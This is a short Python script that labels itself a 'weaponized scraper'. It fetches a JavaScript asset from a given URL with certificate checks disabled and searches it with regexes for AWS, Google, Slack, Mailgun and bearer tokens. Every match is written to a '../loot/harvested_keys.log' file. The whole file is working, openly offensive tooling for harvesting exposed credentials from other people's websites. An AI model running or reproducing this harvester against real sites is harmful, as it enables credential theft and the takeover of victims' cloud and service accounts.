import sys
import requests
import re
import os

def harvest_tokens(url):
    """
    Weaponized Scraper: Locates high-entropy strings and 
    known API key patterns in static JS assets.
    """
    patterns = {
        "AWS_KEY": r"AKIA[0-9A-Z]{16}",
        "AWS_SECRET": r"(\"|')[A-Za-z0-9/+=]{40}(\"|')",
        "GOOGLE_API": r"AIza[0-9A-Za-z-_]{35}",
        "FIREBASE": r"https://[a-z0-9.-]+\.firebaseio\.com",
        "SLACK_TOKEN": r"xox[baprs]-[0-9a-zA-Z]{10,48}",
        "BEARER_TOKEN": r"Bearer\s[a-zA-Z0-9\-\._~+/]+=*",
        "MAILGUN": r"key-[0-9a-zA-Z]{32}"
    }

    print(f"[*] Harvesting Assets from: {url}")
    headers = {"User-Agent": "Chimera-Sovereign/13.5"}

    try:
        r = requests.get(url, headers=headers, timeout=15, verify=False)
        if r.status_code != 200:
            print(f"[-] Failed to fetch asset. Status: {r.status_code}")
            return

        content = r.text
        found_any = False

        print("-" * 60)
        for key_type, regex in patterns.items():
            matches = re.findall(regex, content)
            if matches:
                found_any = True
                unique_matches = list(set(matches))
                print(f"[!!!] {key_type} DETECTED: {len(unique_matches)} unique string(s)")
                for m in unique_matches:
                    print(f"  -> {m}")
                    # Log to loot
                    with open("../loot/harvested_keys.log", "a") as l:
                        l.write(f"Source: {url} | Type: {key_type} | Key: {m}\n")
        
        if not found_any:
            print("[*] No high-entropy patterns identified in this chunk.")
        print("-" * 60)

    except Exception as e:
        print(f"[-] Execution Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: 132_harvester <js_asset_url>")
        sys.exit(1)
    
    harvest_tokens(sys.argv[1])
